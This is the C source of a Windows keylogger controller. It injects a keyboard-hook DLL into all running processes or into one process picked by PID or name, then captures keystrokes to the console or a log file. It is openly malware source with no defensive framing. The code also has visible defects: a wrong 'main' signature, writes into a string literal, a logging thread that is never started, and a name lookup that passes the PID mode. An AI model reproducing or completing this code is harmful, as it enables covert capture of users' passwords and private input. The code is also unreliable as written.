#include "header.h"
#include "getopt.h"
#define KEYBOARD_HOOK_PATH "..\KeyBoardHook.dll" //If you want, change path.
#define KEYBOARD_HOOK_NAME "KeyBoardHook.dll"

HMODULE dllModule = NULL;
PFN_IS_NEW_KEY_HIT IsNewKeyHit= NULL;
PFN_GET_KEYBOARD_VALUE GetKeyboardValue = NULL;
BOOL optFilesave = FALSE;
char* logFileName = "";
FILE* loggingFile = NULL;

DWORD WINAPI GetKeyBoardValueThreadFunc(LPVOID lpParam)
{
	unsigned int loggingCount = 0; //if -s option not used, it's not used

	while (1)
	{
		if (IsNewKeyHit)
		{
			char keyValue = GetKeyboardValue();
			if (optFilesave)
			{
				fprintf_s(loggingFile, "%c", keyValue);
				loggingCount++;

				if (loggingCount % 10 == 0)
					fprintf_s(loggingFile, "\n");
			}
			else
				printf("KeyBoard Hit:%c\n",keyValue);
		}
	}
}

int main(int argc, char* argv)
{
	const char* opt_pattern = "as:p:n:";
	int opt = 0;
	DWORD injectedPID=0;
	DWORD *pInjectedPID = &injectedPID;

	if (argc <= 1)
	{
		//if not input option, Just hook all process
		if (!InjectAllProcess(INJECTION_MODE, KEYBOARD_HOOK_PATH))
		{
			printf("Injection Failed!\n");
			exit(-1);
		}
		printf("All Process Hooked");
	}

	while ((opt = getopt(argc, argv, opt_pattern)) != -1)
	{
		switch (opt)
		{
		case 'a':
			if (!InjectAllProcess(INJECTION_MODE, KEYBOARD_HOOK_PATH))
			{
				printf("Injection Failed!\n");
				exit(-1);
			}
			printf("All Process Hookedn\n");
			break;
		case 's': //Save Log(if option argument exist, it's file name)
			optFilesave = TRUE;
			if (optarg == NULL)
			{
				if (!MakeFileName(logFileName))
				{
					printf("MakeFileName faild!\n");
					exit(-1);
				}
			}
			else
				strncpy(logFileName, optarg, MAX_FILE_LENGTH);
			printf("Save Logging.\n");
			break;
		case 'p'://Hook one process. (option argument: PID) 
			printf("Hook Process PID: %s",optarg);
			if (!SearchProcess(BY_PID, atoi(optarg), NULL, pInjectedPID))
			{
				printf("Can't find process.\n");
				exit(-1);
			}
			InjectDll(injectedPID, KEYBOARD_HOOK_PATH);
			break;
		case 'n'://Hook one process. (option argument: Process name) 
			printf("Hook Process By Name: %s",optarg);
			if (!SearchProcess(BY_PID, 0, optarg, pInjectedPID))
			{
				printf("Can't find process.\n");
				exit(-1);
			}
			InjectDll(injectedPID, KEYBOARD_HOOK_PATH);
			break;
		}
	}

	dllModule = LoadLibrary(KEYBOARD_HOOK_NAME);
	IsNewKeyHit = (PFN_IS_NEW_KEY_HIT)GetProcAddress(dllModule, GET_KEYBOARD_EVENT_FUNC);
	GetKeyboardValue = (PFN_GET_KEYBOARD_VALUE)GetProcAddress(dllModule, GET_KEYBOARD_VALUE_FUNC);

	if (optFilesave)
		loggingFile = fopen(logFileName, "w");
}